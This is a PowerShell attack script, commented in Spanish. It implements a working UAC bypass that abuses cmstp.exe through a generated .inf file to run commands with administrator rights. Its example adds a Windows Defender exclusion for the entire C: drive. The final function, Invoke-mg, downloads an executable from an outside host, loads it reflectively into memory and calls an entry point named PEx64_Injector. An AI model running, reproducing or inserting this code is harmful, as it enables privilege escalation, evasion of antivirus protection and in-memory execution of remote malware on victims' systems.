

function Invoke-UAC
{
<#
 
.SYNOPSIS

Este script sirve para hacer un bypass de uac (Control de cuentas de usuario) en un windows donde el usuario actual este dentro del grupo de administradores y la seguridad de uac se encuentre por defecto, en el caso contrario, si el usuario tiene la configuracion de que uac le avise siempre de cualquier movimiento o en la seguridad maxima, le avisara de cualquier manera y este bypass no funcionara.

.DESCRIPTION

Este script usa codigo en C# para ser cargado en la memoria con Powershell usando reflection, luego es invocada la funcion Execute del codigo de C# cargado, el cual ejecutara el comando que le demos en altos privilegios (administrador)

.PARAMETER Executable


.PARAMETER Command


.EXAMPLE

Ejecutar Invoke-UAC abriendo powershell con un comando que añade una exclusion a Windows Defender.
Invoke-UAC -Executable "powershell" -Command "Add-MpPreference -ExclusionPath C:\"

.EXAMPLE

Ejecutar Invoke-UAC abriendo una cmd (a la vista) que estara elevada
Invoke-UAC -Executable "cmd"

.NOTES

Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>


 param(
     [Parameter()]
     [string]$Executable,
 
     [Parameter()]
     [string]$Command

 )

    if (![System.IO.File]::Exists($Executable)) {
        $Executable =  (Get-Command $Executable).Source
         if (![System.IO.File]::Exists($Executable)) {
                Write-Host "[!] Ejecutable no encontrado"
                exit
         }
    }
    
    if ($Executable -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
    {
        if ($Command -ne "") {
            $final = "powershell -c ""$Command"""
        } else {
            $final =  "$Executable $Command"
        }
 
    } elseif  ($Executable -eq "C:\Windows\system32\cmd.exe") 
    {
        if ($Command -ne "") 
        {
            $final = "cmd /c ""$Command"""
        } else {
            $final =  "$Executable $Command"
        }

    } else 
    {
        
        $final =  "$Executable $Command"
    
    }

$sign = '$chicago$'
$code = @"
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = "C:\\windows\\temp";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));

        Console.WriteLine("Payload file written to " + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
"@

function Execute {
    try 
    {
    
        $result = [CMSTPBypass]::Execute($final) 
    } 
    catch 
    {
        Add-Type $code
        $result = [CMSTPBypass]::Execute($final) 
    }

    if ($result) { 
        Write-Output "[*] Elevacion exitosa"
    } 
    else {
        Write-Output "[!] Ocurrio un error"
    }
}

$process =  ((Get-WmiObject -Class win32_process).name  | Select-String "cmstp" |  Select-Object * -First 1).Pattern
if ($process -eq "cmstp") {
    try 
    {
         Stop-Process -Name "cmstp"
         Execute
    }
    catch 
    {
        Write-Host "[!] Error en la ejecucion de Invoke-UAC, intente cerrar el proceso cmstp.exe"
    }
} 
else {
    Execute
}
}

function  Invoke-mg {
  $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://skt.mcsoft.org/Migrator7.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [PEx64_Injector.Program]::Main("")
}
